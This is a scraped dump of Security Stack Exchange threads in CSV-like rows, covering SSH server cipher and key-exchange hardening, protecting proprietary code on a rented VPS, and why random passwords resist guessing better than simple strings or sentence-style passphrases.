","0"
"257670","257670","SSH Server Configuration Best Practices?","<p>I have been tasked with reviewing the settings of an SSH server, I'm currently trying to figure out what are the best practices, and I'm having a bit of trouble finding a good answer. I keep finding a lot of information related to web servers, but I don't know if that fully applies here.</p>
<p>These are the currently enabled settings.</p>
<p><strong>SSH Key Type:</strong> ssh-dsa (ssh-rsa seems to be recommended)</p>
<p><strong>SSH Ciphers:</strong> AES-128-cbc, AES-192-cbc, AES-256-cbc, AES-128-ctr, AES-192-ctr, AES-256-ctr, Rijndael-cbc</p>
<p><strong>SSH MACs:</strong> MD5, SHA1, SHA1 96, SHA2 256, SHA2 256-96, SHA2 512, SHA2 512-96</p>
<p><strong>SSH Key Exchange Algorithms:</strong> DH-GROUP1-SHA1, DH-GROUP14-SHA1, DH-GROUP14-SHA2 256, DH-GROUP16-SHA2 512, DH-GROUP-EXCHANGE-SHA2 256, ECDH-SHA2-NISTP256, ECDH-SHA2-NISTP384, ECDH-SHA2-NISTP521</p>
<p>Would anyone be able to perhaps point me in the right direction where I can read up on best pactices and what ciphers, MACs, algorithms should be disabled/enabled?</p>
","3","4","257671","<p>I think the IETF CURDLE stuff is a good place to start, see <a href=""https://datatracker.ietf.org/wg/curdle/documents/"" rel=""nofollow noreferrer"">this</a>.  I hadn't looked at it in a while, but it appears a lot of the stuff has been moved from draft status to RFC.  The only one that's not right now is a <a href=""https://datatracker.ietf.org/doc/draft-ietf-curdle-ssh-kex-sha2/"" rel=""nofollow noreferrer"">suggested updated for KEX for SSH</a>.</p>
","1"
"257670","257670","SSH Server Configuration Best Practices?","<p>I have been tasked with reviewing the settings of an SSH server, I'm currently trying to figure out what are the best practices, and I'm having a bit of trouble finding a good answer. I keep finding a lot of information related to web servers, but I don't know if that fully applies here.</p>
<p>These are the currently enabled settings.</p>
<p><strong>SSH Key Type:</strong> ssh-dsa (ssh-rsa seems to be recommended)</p>
<p><strong>SSH Ciphers:</strong> AES-128-cbc, AES-192-cbc, AES-256-cbc, AES-128-ctr, AES-192-ctr, AES-256-ctr, Rijndael-cbc</p>
<p><strong>SSH MACs:</strong> MD5, SHA1, SHA1 96, SHA2 256, SHA2 256-96, SHA2 512, SHA2 512-96</p>
<p><strong>SSH Key Exchange Algorithms:</strong> DH-GROUP1-SHA1, DH-GROUP14-SHA1, DH-GROUP14-SHA2 256, DH-GROUP16-SHA2 512, DH-GROUP-EXCHANGE-SHA2 256, ECDH-SHA2-NISTP256, ECDH-SHA2-NISTP384, ECDH-SHA2-NISTP521</p>
<p>Would anyone be able to perhaps point me in the right direction where I can read up on best pactices and what ciphers, MACs, algorithms should be disabled/enabled?</p>
","3","4","257674","<p>For me ssh.com is a good reference. If you want specific SSH server best practices it's <a href=""https://www.ssh.com/academy/ssh/sshd_config"" rel=""nofollow noreferrer"">the place to go to</a>. There's also a section on cryptography policy.</p>
<p>For cryptographic mechanisms to be used in SSH server I would go to <a href=""https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Publications/TechGuidelines/TG02102/BSI-TR-02102-4.html"" rel=""nofollow noreferrer"">BSI TR-02102-4</a> (01-2021) recommendations.</p>
","0"
"257670","257670","SSH Server Configuration Best Practices?","<p>I have been tasked with reviewing the settings of an SSH server, I'm currently trying to figure out what are the best practices, and I'm having a bit of trouble finding a good answer. I keep finding a lot of information related to web servers, but I don't know if that fully applies here.</p>
<p>These are the currently enabled settings.</p>
<p><strong>SSH Key Type:</strong> ssh-dsa (ssh-rsa seems to be recommended)</p>
<p><strong>SSH Ciphers:</strong> AES-128-cbc, AES-192-cbc, AES-256-cbc, AES-128-ctr, AES-192-ctr, AES-256-ctr, Rijndael-cbc</p>
<p><strong>SSH MACs:</strong> MD5, SHA1, SHA1 96, SHA2 256, SHA2 256-96, SHA2 512, SHA2 512-96</p>
<p><strong>SSH Key Exchange Algorithms:</strong> DH-GROUP1-SHA1, DH-GROUP14-SHA1, DH-GROUP14-SHA2 256, DH-GROUP16-SHA2 512, DH-GROUP-EXCHANGE-SHA2 256, ECDH-SHA2-NISTP256, ECDH-SHA2-NISTP384, ECDH-SHA2-NISTP521</p>
<p>Would anyone be able to perhaps point me in the right direction where I can read up on best pactices and what ciphers, MACs, algorithms should be disabled/enabled?</p>
","3","4","257676","<p>One thing you might want to do is disable password authentication and enable <strong>public key authentication</strong>.</p>
<p>As per SSH.com:</p>
<blockquote>
<p>The motivation for using public key authentication over simple
passwords is security. Public key authentication provides
cryptographic strength that even extremely long passwords can not
offer. With SSH, public key authentication improves security
considerably as it frees the users from remembering complicated
passwords (or worse yet, writing them down).</p>
<p>In addition to security public key authentication also offers
usability benefits - it allows users to implement single sign-on
across the SSH servers they connect to. Public key authentication also
allows automated, passwordless login that is a key enabler for the
countless secure automation processes that execute within enterprise
networks globally.</p>
</blockquote>
<p>Source: <a href=""https://www.ssh.com/academy/ssh/public-key-authentication"" rel=""nofollow noreferrer"">https://www.ssh.com/academy/ssh/public-key-authentication</a></p>
<p>Some instructions to disable password authentication: <a href=""https://www.cyberciti.biz/faq/how-to-disable-ssh-password-login-on-linux/"" rel=""nofollow noreferrer"">How to disable ssh password login on Linux to increase security</a>.</p>
<p>If you must continue to support password authentication for some reason, then obviously use strong passwords that cannot be guessed easily or succumb to brute force (dictionary) attacks. Use a <strong>password manager</strong> for your IT needs.</p>
<p>If you can, in order to reduce the <strong>attack surface</strong>, you could restrict access to port 22 to static, designated IP addresses under your control - for example your own VPN.</p>
<p>Furthermore, you can also use tools like ipban, sshguard, fail2ban etc to defeat brute force attacks against your SSH service. Even if the attacks are doomed to fail, they consume resources for nothing so just ban the offenders automatically.</p>
","0"
"257670","257670","SSH Server Configuration Best Practices?","<p>I have been tasked with reviewing the settings of an SSH server, I'm currently trying to figure out what are the best practices, and I'm having a bit of trouble finding a good answer. I keep finding a lot of information related to web servers, but I don't know if that fully applies here.</p>
<p>These are the currently enabled settings.</p>
<p><strong>SSH Key Type:</strong> ssh-dsa (ssh-rsa seems to be recommended)</p>
<p><strong>SSH Ciphers:</strong> AES-128-cbc, AES-192-cbc, AES-256-cbc, AES-128-ctr, AES-192-ctr, AES-256-ctr, Rijndael-cbc</p>
<p><strong>SSH MACs:</strong> MD5, SHA1, SHA1 96, SHA2 256, SHA2 256-96, SHA2 512, SHA2 512-96</p>
<p><strong>SSH Key Exchange Algorithms:</strong> DH-GROUP1-SHA1, DH-GROUP14-SHA1, DH-GROUP14-SHA2 256, DH-GROUP16-SHA2 512, DH-GROUP-EXCHANGE-SHA2 256, ECDH-SHA2-NISTP256, ECDH-SHA2-NISTP384, ECDH-SHA2-NISTP521</p>
<p>Would anyone be able to perhaps point me in the right direction where I can read up on best pactices and what ciphers, MACs, algorithms should be disabled/enabled?</p>
","3","4","257678","<p>The defaults for a recent version of openssh are good.</p>
<p>The server's asymmetric key type and client's asymmetric key type are specified in
<a href=""https://man.openbsd.org/ssh_config.5#HostKeyAlgorithms"" rel=""noreferrer"">HostKeyAlgorithms</a> and <a href=""https://man.openbsd.org/ssh_config.5#PubkeyAcceptedAlgorithms"" rel=""noreferrer"">PubkeyAcceptedAlgorithms</a> respectively.</p>
<ul>
<li>EdDSA over modern curves (Ed25519) is preferred over ECDSA using NIST P curves, which are preferred over RSA signatures which is preferred over DSA signatures (which are dead).</li>
<li>I believe NIST P curves are not backdoored and are safe to use in ECDH and ECDSA (provided your implementation is good and your CSPRNG is good). See <a href=""https://crypto.stackexchange.com/a/12917/24949"">this</a> answer by Thomas Pornin for reasoning.</li>
<li>The curves need to be at least 256 bits.</li>
<li>RSA keys need to have a modulus of at least 2048 bits but 3072 or 4096 are better because strictly speaking 2048 bits provides only about 112 &quot;<a href=""https://en.wikipedia.org/wiki/Security_level"" rel=""noreferrer"">bits of security</a>&quot; while the recommendation is 128.</li>
<li>All must use SHA2 and not use SHA1.</li>
</ul>
<p>So, in order:</p>
<ol>
<li><code>ssh-ed25519</code></li>
<li><code>ecdsa-sha2-nistp256</code>, <code>ecdsa-sha2-nistp384</code>, <code>ecdsa-sha2-nistp521</code></li>
<li><code>rsa-sha2-512</code>, <code>rsa-sha2-256</code>, <code>ssh-rsa-sha256@ssh.com</code></li>
</ol>
<p>Don't use:</p>
<ol>
<li><code>ssh-rsa</code> (this uses SHA1)</li>
<li><code>ssh-dsa</code> (this also uses SHA1 but also DSA is dead)</li>
</ol>
<p>The <code>sk-</code> variants are for hardware devices that hold the key and are equivalent. The <code>cert</code> variants are for ssh certificates (not X.509 certificates used for TLS) and are equivalent.</p>
<p>The asymmetric key exchange is specified by <a href=""https://man.openbsd.org/ssh_config.5#KexAlgorithms"" rel=""noreferrer"">KexAlgorithms</a>.</p>
<p>ECDH over modern curves (X25519) is preferred over ECDH with NIST P curves which are preferred over FFDHE. Again the curves need to be at least 256 bits, the FFDHE group needs to be at least 2048 bits though again 3072 or 4096 is preferred. Again everything must use SHA2 and not use SHA1.</p>
<p>So, in order:</p>
<ol>
<li><code>curve25519-sha256</code>, <code>curve25519-sha256@libssh.org</code></li>
<li><code>ecdh-sha2-nistp256</code>, <code>ecdh-sha2-nistp384</code>, <code>ecdh-sha2-nistp521</code></li>
<li><code>diffie-hellman-group16-sha512</code>, <code>diffie-hellman-group15-sha512</code></li>
<li><code>diffie-hellman-group14-sha256</code>, <code>diffie-hellman-group-exchange-sha256</code> (2048 bit) - this is up to you, I think 2048 bits is not broken and the NSA will not bother decrypting my recorded SSH traffic in ten or twenty years, but you can say you want at least 4096 bits and that's ok.</li>
</ol>
<p>Don't use:</p>
<ol>
<li><code>diffie-hellman-group14-sha1</code>, <code>diffie-hellman-group-exchange-sha1</code>, <code>diffie-hellman-group-exchange-sha1</code> - because SHA1</li>
<li><code>diffie-hellman-group-exchange-sha256</code> (1024 bit) - because group is too small</li>
<li><code>diffie-hellman-group18-sha512</code>, <code>diffie-hellman-group17-sha512</code> - secure but overkill, slow for no reason</li>
</ol>
<p>The symmetric ciphers can be newer AEAD or older cipher + separate MAC than need to be combined. The cipher is specified by <a href=""https://man.openbsd.org/ssh_config.5#Ciphers"" rel=""noreferrer"">Ciphers</a> and the MAC, if your cipher is not an AEAD is specified by <a href=""https://man.openbsd.org/ssh_config.5#MACs"" rel=""noreferrer"">MACs</a>.</p>
<ul>
<li>Almost all AEADs (including GCM and ChaCha) are built on top of CTR.</li>
<li>AES-GCM is the most popular because it is fast and wasn't encumbered by patents like OCB3.</li>
<li>ChaPoly is popular as the safest choice because it has more security
margin than AES and doesn't require special hardware the way AES-GCM
does (AESNI and CLMUL). But because both ends of an ssh connection
are very likely to be x86 chips that do have the special hardware,
AES-GCM is still the most popular.</li>
<li>For compatibility, AES-CTR
combined with HMAC-SHA2 in EtM is safe (but slower).</li>
<li>If cipher + MAC is used, &quot;encrypt then MAC&quot; is the better combination but we didn't know that in the 90s so it's not the default.</li>
<li>If a hash function is
used (in HMAC), SHA2 should be used and SHA1 should not be used, even
though it is safe in HMAC, because better to just not use SHA1.</li>
<li>SHA-512 is faster than SHA-256 on 64bit chips (like servers, laptops, smartphones and tablets).</li>
</ul>
<p>So, in order:</p>
<ol>
<li><code>chacha20-poly1305@openssh.com</code> ciphers</li>
<li><code>aes128-gcm@openssh.com</code>, <code>aes256-gcm@openssh.com</code> ciphers</li>
<li><code>aes128-ctr</code>, <code>aes192-ctr</code>, <code>aes256-ctr</code> ciphers when combined with <code>hmac-sha2-512-etm@openssh.com</code>, <code>hmac-sha2-256-etm@openssh.com</code> MACs</li>
<li><code>aes128-ctr</code>, <code>aes192-ctr</code>, <code>aes256-ctr</code> ciphers when combined with <code>umac-128-etm@openssh.com</code> MACs</li>
</ol>
<p>Don't use:</p>
<ol>
<li><code>aes128-cbc</code>, <code>aes192-cbc</code>, <code>aes256-cbc</code> ciphers when combined with <code>hmac-sha2-512-etm@openssh.com</code>, <code>hmac-sha2-256-etm@openssh.com</code> MACs. CBC was disabled by default in openssh 6.7, though maybe safe (but slow) because <code>-etm</code> MAC should protect you. But only if you have to.</li>
<li><code>aes128-cbc</code> ciphers with HMAC MAC but a variant without <code>-etm</code> is probably actually dangerous, definitely avoid.</li>
<li><code>hmac-sha2-512</code>, <code>hmac-sha2-256</code>, <code>umac-128@openssh.com</code> MACs not in <code>-etm</code> variant sound dangerous, avoid.</li>
<li><code>twofish-cbc</code>, <code>twofish128-cbc</code>, <code>twofish256-cbc</code>, <code>twofish128-ctr</code>, <code>twofish256-ctr</code> ciphers - Twofish is a cipher that didn't become popular. It has received much less scrutiny than AES and ChaCha, because it is less popular. It's probably safe, but I would not use it.</li>
<li><code>3des-cbc</code>, <code>3des-ctr</code> ciphers - 3DES is slow and has a small 64bit block which makes it susceptible to SWEET32, don't use.</li>
<li><code>arcfour</code>, <code>arcfour128</code>, <code>arcfour256</code>, <code>blowfish</code>, <code>cast</code> ciphers - These are obsolete, don't use them. Arcfour (RC4) is definitely broken.</li>
<li><code>hmac-sha1</code> MAC - better to just not use SHA1</li>
<li><code>umac-64@openssh.com</code>, <code>umac-64-etm@openssh.com</code> MACs - small tag size, don't use.</li>
</ol>
<p>NIST are working on cryptography that is not vulnerable to big quantum computers. They aim to standardize something long before anyone has a big enough quantum computer, so that by the time a big quantum computer is built to decrypt long ago recorded traffic, the information is irrelevant. People are running experimental PQC algorithms. I would wait for this to shake down and switch to whatever emerges.</p>
","7"
"257638","257638","security measures for proprietary code on a VPS","<p>I've got several C++ and Python scripts containing proprietary algorithms, which are latency-sensitive and hence need to be on a system near the data center serving data to them. While a VPS is economical, I worry that the administrators may snoop. Perhaps a dedicated server (esp colocated <em>in</em> the data center) which I deliver myself for deployment, is the best option.
But, what do you think about having a virtual machine on the VPS (Hyper-V in Windows, or Virtualbox) which adds another layer of password protection (not encryption per se)?</p>
<p>And yes, I know that most/any legit hosting co has thousands of VPS instances, which would be very cumbersome to comb through. But I've got to plan for the outlier scenarios.</p>
","1","3","257667","<p>Not all providers allow nested virtualization. You'd maybe make analysis a bit harder but running your own hardware is the better option when you don't trust the VPS provider.</p>
","1"
"257638","257638","security measures for proprietary code on a VPS","<p>I've got several C++ and Python scripts containing proprietary algorithms, which are latency-sensitive and hence need to be on a system near the data center serving data to them. While a VPS is economical, I worry that the administrators may snoop. Perhaps a dedicated server (esp colocated <em>in</em> the data center) which I deliver myself for deployment, is the best option.
But, what do you think about having a virtual machine on the VPS (Hyper-V in Windows, or Virtualbox) which adds another layer of password protection (not encryption per se)?</p>
<p>And yes, I know that most/any legit hosting co has thousands of VPS instances, which would be very cumbersome to comb through. But I've got to plan for the outlier scenarios.</p>
","1","3","257669","<p>If you don't control the hardware, you don't control anything running inside it.</p>
<p>Even if you have a virtualized environment inside another, it won't protect anything. The host can dump the memory of the guest, and dump whatever virtual environment you have inside.</p>
<p>Your protection is the reputation of your provider. Find a provider that hosts private information and have a large consumer base, and that's it. They have pretty stringent rules on what their staff can do, and will not damage their reputation for snooping on your code.</p>
","3"
"257638","257638","security measures for proprietary code on a VPS","<p>I've got several C++ and Python scripts containing proprietary algorithms, which are latency-sensitive and hence need to be on a system near the data center serving data to them. While a VPS is economical, I worry that the administrators may snoop. Perhaps a dedicated server (esp colocated <em>in</em> the data center) which I deliver myself for deployment, is the best option.
But, what do you think about having a virtual machine on the VPS (Hyper-V in Windows, or Virtualbox) which adds another layer of password protection (not encryption per se)?</p>
<p>And yes, I know that most/any legit hosting co has thousands of VPS instances, which would be very cumbersome to comb through. But I've got to plan for the outlier scenarios.</p>
","1","3","257673","<p>It is <em>technically</em> possible to do this in a secure way. Someone has already built <a href=""https://github.com/f-prime/arcanevm"" rel=""nofollow noreferrer"">a Brainfuck VM that can run encrypted programs using homomorphic encryption</a>. You could theoretically run your algorithm inside a similar VM, but the performance penalty would almost certainly make it not worth it.</p>
<p>If you are tolerant of a lower level of security, <a href=""https://www.intel.com/content/www/us/en/architecture-and-technology/software-guard-extensions.html"" rel=""nofollow noreferrer"">Intel SGX</a> or <a href=""https://developer.amd.com/sev/"" rel=""nofollow noreferrer"">AMD SEV</a> can provide reasonably performant computing while still making it really difficult for someone to read the memory of your program even if they have physical access to the computer.</p>
<p>Note that there is a big difference in usability between Intel and AMD's implementation here. Intel intends you to only encrypt the data from certain confidential parts of your program, though you can use it to encrypt the program as well. There is a paper on this use of SGX <a href=""https://web.cse.ohio-state.edu/%7Elin.3021/file/CGO18.pdf"" rel=""nofollow noreferrer"">here</a>, complete with a sample implementation. AMD's implementation is designed to encrypt the memory of an entire VM, and so is much easier to use. <a href=""https://cloud.google.com/confidential-computing"" rel=""nofollow noreferrer"">Google sells this as a service</a>, which sounds like what you want.</p>
","1"
"257611","257611","Why use random characters in passwords?","<p>I've seen some similar questions but maybe not exactly what I'm asking. Also I can't say that I've followed all the technical jargon in previous posts and am really after more of an intuitive understanding.</p>
<p>So let's say I'm allowed ten characters. The usual requirement is to use numbers, symbols, etc. But why is <code>#^Afx375Zq</code> more secure than <code>aaaaaaaaaa</code>? The hacker doesn't know that I've repeated a character ten times, so doesn't he still have to go through the testing of all possibilities or are things like repeated characters tested first?</p>
<p>Similarly, suppose I use a 21-character passphrase such as</p>
<pre><code>I like Beatles' songs.
</code></pre>
<p>Now someone might say that that's a common type of statement but again the hacker doesn't know that I'm using a passphrase instead of</p>
<pre><code>DD63@*()ZZZ125++dkeic
</code></pre>
<p>so why is it (I assume) less secure? Are passphrases tested first?</p>
","36","8","257613","<p>Attackers try the most common passwords first, because they're the most likely ones that will work. So they might start with things like <code>password</code> or <code>Password1</code> or common patterns such as <code>123456</code>, <code>1qaz2wsx</code> or <code>aaaaaaaaaa</code></p>
<p>For example, there's a common technique called &quot;password spraying&quot;, when rather than trying lots of passwords against one account, you try a few common passwords (such as <code>Password1</code>) against lots of different accounts. This is useful when you want to compromise <em>any</em> account, rather than having a specific target.</p>
<p>If they don't have success with common passwords, then they'll try increasingly uncommon things like longer words, using rules to mutate the words (such as adding numbers on the end or capitalising them), combining multiple words together, or even exhaustive brute-force attacks of shorter lengths.</p>
<p>One method of creating lists of potential passwords is to crawl websites for words and phrases (especially as more people have started using phrases). So a passphrase such as <code>I like Beatles' song.</code> might appear in one of these lists, because it's a phrase that might appear on the Internet somewhere. But a long random string will never appear in a wordlist (unless you post it on Stack Exchange), and 21 characters is far too long for an attacker to brute-force).</p>
<p>If you want to create secure passwords, the best options are either a long, random string like the one you posted (which is what most password managers do), or a series of multiple <em>unrelated</em> words. So rather than a sentence (like the example you gave), just pick four random words (such as the famous <a href=""https://xkcd.com/936/"" rel=""noreferrer"">XKCD</a> example of <code>CorrectHorseBatteryStaple</code>).</p>
","24"
"257611","257611","Why use random characters in passwords?","<p>I've seen some similar questions but maybe not exactly what I'm asking. Also I can't say that I've followed all the technical jargon in previous posts and am really after more of an intuitive understanding.</p>
<p>So let's say I'm allowed ten characters. The usual requirement is to use numbers, symbols, etc. But why is <code>#^Afx375Zq</code> more secure than <code>aaaaaaaaaa</code>? The hacker doesn't know that I've repeated a character ten times, so doesn't he still have to go through the testing of all possibilities or are things like repeated characters tested first?</p>
<p>Similarly, suppose I use a 21-character passphrase such as</p>
<pre><code>I like Beatles' songs.
</code></pre>
<p>Now someone might say that that's a common type of statement but again the hacker doesn't know that I'm using a passphrase instead of</p>
<pre><code>DD63@*()ZZZ125++dkeic
</code></pre>
<p>so why is it (I assume) less secure? Are passphrases tested first?</p>
","36","8","257620","<p>The strength of a password is determined by its scheme. A code like <code>aaaaaaaaaa</code> must be assumed to have a scheme of &quot;ten letters&quot; and is therefore trivially cracked compared to the scheme we must assume from <code>#^Afx375Zq</code>.</p>
<p>Attackers prioritize the simplest arrangement that meets the password scheme: start with a capital letter, end with a number and then punctuation, fill the middle with the minimum lowercase letters, starting with words as sorted by frequency. I have such a dictionary, so I could start with <code>Anything0!</code> through <code>Zzzombie9~</code>, then progress to the non-word combinations of <code>Aaaaaaaa0!</code> through <code>Zzzzzzzz9~</code> before different variations.</p>
<p>Ensuring your password is more complex than the minimally permissible code gives you a slight advantage; <code>#aaaaaaaaa</code> should take a few minutes longer to crack as <code>aaaaaaaaaa</code>. <code>#^Afx375Zq</code> will take a good amount longer because it mixes four classes of characters and only uses three lowercase letters.</p>
<p>Always assume attackers know your scheme. You may get lucky and be able to hide behind some obscurity, which is certainly worthwhile, but it must not factor into your math. Don't try to be &quot;clever&quot;—<a href=""https://zdnet.com/article/kaspersky-password-manager-caught-out-making-easily-bruteforced-passwords/"" rel=""noreferrer"">Kaspersky's attempt at this ended in failure</a>; they made assumptions about the attack order that ended up creating <em>much</em> weaker passwords.</p>
<p>Forcing users to add complexity to the characters in their passwords forces attackers to increase the complexity of their brute-force attacks, though it actually <em>weakens</em> the overall entropy. It prevents lazy and easily-guessed passwords like <code>aaaaaaaaaa</code> by removing them from the possible password list. There are 94⁸ possible eight-character passwords (60 quintillion, entropy = 52), yet requiring a lower, upper, number, and special reduce that to 26×26×10×32×94⁴ (16 trillion, entropy = 43).</p>
<p><code>I like Beatles' songs.</code> is neither random nor unique. Unsurprisingly, Google has hits for it.</p>
<p>👉 <a href=""https://security.stackexchange.com/a/257111/42391""><em><strong>If a Google query for your password (quoted &amp; de-0bfuscated) might get hits, it is weak.</strong></em></a></p>
<p><strong>Passwords must actually be random</strong> (<a href=""https://twitter.com/adamhotep/status/1234631623322324993"" rel=""noreferrer"">not arbitrary! not obscure!</a> a <a href=""https://en.wikipedia.org/wiki/Pseudorandom_number_generator"" rel=""noreferrer"">pseudorandom number generator</a> is okay), by characters (for passcodes) or by words (for passphrases). <code>I like Beatles' pants.</code> is more unique, but it's arbitrary, not random. You cannot &quot;make up&quot; a random phrase without assistance (ideally using a generator), only one that <em>seems</em> random. It's okay to generate several phrases and pick one that you can make a creative story around.</p>
<p>I <a href=""https://security.stackexchange.com/a/93628/42391"" title=""log₂(100,000 words) / log₂(94 characters) = 2.534"">calculated</a> a word is worth 2.5 characters, so for equivalent entropy to a passcode with 10 random characters, log₂(94¹⁰) = 65, you'd need a passphrase with 4 random words, log₂(100000⁴) = 66. That's on the weaker side, and again: a passphrase that is a sentence is <em>not</em> secure.</p>
<p><strong>Length isn't everything.</strong> Don't be fooled by the impressive length of a passphrase. Sure, your musical preference is 21 characters, but even if we assume it's random and not known to Google, it's four words with some punctuation thrown in: log₂(100000⁴×32²) = 76. Compare that to random lowercase letters: log₂(26²¹) = 98. Compare those to random characters: log₂(94²¹) = 137.</p>
<p><strong>A summary of <a href=""https://security.stackexchange.com/a/257595/42391"" title=""How many bits of entropy should a password have to be reasonably future proof (10+ years)?"">my password advice</a>:</strong>
The world has gotten sophisticated enough that it's impossible to remember your fully-random and unique-per-account passwords (be they codes or phrases).</p>
<ul>
<li>Use authenticator apps for 2FA or passwordless access when available</li>
<li>Use a password manager to generate and save passwords</li>
<li>Lock your password manager with a strong password with 90+ bits of entropy,<br />
say with a generated 4char code randomly placed within a generated 4word phrase,<br />
entropy = log₂(100000⁴×94⁴×5) = 94, like <code>junkie unknotted 7!cT opposite litter</code>.<br />
Make a story to remember the words and keep the 4char code in your wallet if needed.</li>
</ul>
","62"
"257611","257611","Why use random characters in passwords?","<p>I've seen some similar questions but maybe not exactly what I'm asking. Also I can't say that I've followed all the technical jargon in previous posts and am really after more of an intuitive understanding.</p>
<p>So let's say I'm allowed ten characters. The usual requirement is to use numbers, symbols, etc. But why is <code>#^Afx375Zq</code> more secure than <code>aaaaaaaaaa</code>? The hacker doesn't know that I've repeated a character ten times, so doesn't he still have to go through the testing of all possibilities or are things like repeated characters tested first?</p>
<p>Similarly, suppose I use a 21-character passphrase such as</p>
<pre><code>I like Beatles' songs.
</code></pre>
<p>Now someone might say that that's a common type of statement but again the hacker doesn't know that I'm using a passphrase instead of</p>
<pre><code>DD63@*()ZZZ125++dkeic
</code></pre>
<p>so why is it (I assume) less secure? Are passphrases tested first?</p>
","36","8","257635","<p>If you were to generate a totally random password that is 10 letters long and can contain lower and upper case letters, numbers and common symbols, then you are equally likely to come up with <strong>#^Afx375Zq</strong> as you are <strong>aaaaaaaaaa</strong>. So from that point of view you're right that the passwords are equally secure.</p>
<p>However, most passwords are not generated randomly. They are chosen by humans, and humans don't pick a completely random series of characters. They choose something that they will be able to remember, and clearly the second password is much easier to remember than the first.</p>
<p>Therefore, if you take a large enough database of user accounts, you are likely to find that far more of them have chosen your second password than your first. As an attacker I can use that knowledge, so I'll test easy to remember passwords first.</p>
","61"
"257611","257611","Why use random characters in passwords?","<p>I've seen some similar questions but maybe not exactly what I'm asking. Also I can't say that I've followed all the technical jargon in previous posts and am really after more of an intuitive understanding.</p>
<p>So let's say I'm allowed ten characters. The usual requirement is to use numbers, symbols, etc. But why is <code>#^Afx375Zq</code> more secure than <code>aaaaaaaaaa</code>? The hacker doesn't know that I've repeated a character ten times, so doesn't he still have to go through the testing of all possibilities or are things like repeated characters tested first?</p>
<p>Similarly, suppose I use a 21-character passphrase such as</p>
<pre><code>I like Beatles' songs.
</code></pre>
<p>Now someone might say that that's a common type of statement but again the hacker doesn't know that I'm using a passphrase instead of</p>
<pre><code>DD63@*()ZZZ125++dkeic
</code></pre>
<p>so why is it (I assume) less secure? Are passphrases tested first?</p>
","36","8","257683","<p>I am not a security expert, but I feel like I need to add two points.</p>
<ol>
<li><p>Tools that brute-force passwords will simply start at 000000 then 0000001 and aaaaaaaa is really, really easy to get in the first few seconds of that &quot;set&quot; of N digits. I don't know of any exact tools, but this is what I learned from ye olde tutorials on astalavista, before it became ads, and was a hacker search.</p>
</li>
<li><p>The top answer, which states &quot;aaaaa&quot; is just as likely strikes me as mathematically inaccurate. Even-distribution algorithms have a bias to not give the same thing they just did. They're not unbiased, it's just split among all numbers instead of a specific number or set of numbers.</p>
</li>
</ol>
","-3"
"257611","257611","Why use random characters in passwords?","<p>I've seen some similar questions but maybe not exactly what I'm asking. Also I can't say that I've followed all the technical jargon in previous posts and am really after more of an intuitive understanding.</p>
<p>So let's say I'm allowed ten characters. The usual requirement is to use numbers, symbols, etc. But why is <code>#^Afx375Zq</code> more secure than <code>aaaaaaaaaa</code>? The hacker doesn't know that I've repeated a character ten times, so doesn't he still have to go through the testing of all possibilities or are things like repeated characters tested first?</p>
<p>Similarly, suppose I use a 21-character passphrase such as</p>
<pre><code>I like Beatles' songs.
</code></pre>
<p>Now someone might say that that's a common type of statement but again the hacker doesn't know that I'm using a passphrase instead of</p>
<pre><code>DD63@*()ZZZ125++dkeic
</code></pre>
<p>so why is it (I assume) less secure? Are passphrases tested first?</p>
","36","8","257700","<p>Most people, including lots of them who write password policies, don't actually understand passwords. Exhibit A: The original author of the &quot;complexity&quot; rules <a href=""https://specopssoft.com/blog/father-password-rules-sorry-wasting-time/"" rel=""nofollow noreferrer"">is now sorry for his mistake</a>.</p>
<p>We now know that length is more important than complexity. We also know that you do not want your password to be:</p>
<p>a) something common, like 12345678 (yes, that's a very common password) which any of the available tools will try within the first five seconds.</p>
<p>b) something easily guessable like your dog's name that anyone somewhat familiar with you (or following you on Facebook) would try in a targeted low-effort attack.</p>
<p>Beyond that, fuck all the rules, they're silly. Most attacks on passwords don't brute-force. Most compromised passwords are leaked in one way or the other, in which case it really doesn't matter if your password is 123 or +)r%rARAT:Am))17z(rZk!,%ODbsz0</p>
<p>So why do you want to use some randomness in your passwords? Because of b) - humans are terrible at making something random or difficult to guess. Include at least a random part. Something like &quot;I was born in (random three-digit number)&quot; is a ton better as a password than whatever the complexity meters tell you.</p>
<p>Your phrase is pretty good - unless it is true. If it is true it falls under b) and trying out fifty statements each in a hundred different phrases and spellings is easily scripted.</p>
<p>Unless you're a high-profile target, stop worrying beyond that. You are much more likely to be compromised by software vulnerabilities than by someone spending the resources to brute-force even a mildly good password.</p>
","1"
"257611","257611","Why use random characters in passwords?","<p>I've seen some similar questions but maybe not exactly what I'm asking. Also I can't say that I've followed all the technical jargon in previous posts and am really after more of an intuitive understanding.</p>
<p>So let's say I'm allowed ten characters. The usual requirement is to use numbers, symbols, etc. But why is <code>#^Afx375Zq</code> more secure than <code>aaaaaaaaaa</code>? The hacker doesn't know that I've repeated a character ten times, so doesn't he still have to go through the testing of all possibilities or are things like repeated characters tested first?</p>
<p>Similarly, suppose I use a 21-character passphrase such as</p>
<pre><code>I like Beatles' songs.
</code></pre>
<p>Now someone might say that that's a common type of statement but again the hacker doesn't know that I'm using a passphrase instead of</p>
<pre><code>DD63@*()ZZZ125++dkeic
</code></pre>
<p>so why is it (I assume) less secure? Are passphrases tested first?</p>
","36","8","257741","<p>Before the advent of password managers, because <strong>people needed to be able to remember passwords</strong>, they had a tendency to <strong>pick simple passwords</strong>.</p>
<p>Simple passwords are <strong>extremely</strong> common. You know, &quot;password&quot;, &quot;123456&quot;, &quot;qwerty&quot;, and so on. Don't laugh, those are actually 3 of the most common passwords in use! But there are looooong <strong>lists of common passwords</strong>, and hackers usually start with those (<strong>dictionary attacks</strong>). And yes, <strong><code>aaaaaaaaaa</code> is in the top 10 000 most common passwords</strong> (along with various other lengths).</p>
<p>So, in order to <strong>force people to come up with something a bit different</strong>, rules like those were introduced. Are they good rules? Apparently they do help, as none of the most common passwords contain the often required combination of lower, upper, symbol and digit.</p>
<p>The next issue after that is that once people have found a password which fits those rules AND they can remember, they <strong>re-use it everywhere</strong>, and from there you have the issue that a leak on one site will affect your accounts on all other sites where you sued the same password. This is why the current <strong>best practice is to use password managers</strong> (but that is not something sites can enforce, this is a user-side policy), which will generate and securely store <strong>random</strong> passwords for you.</p>
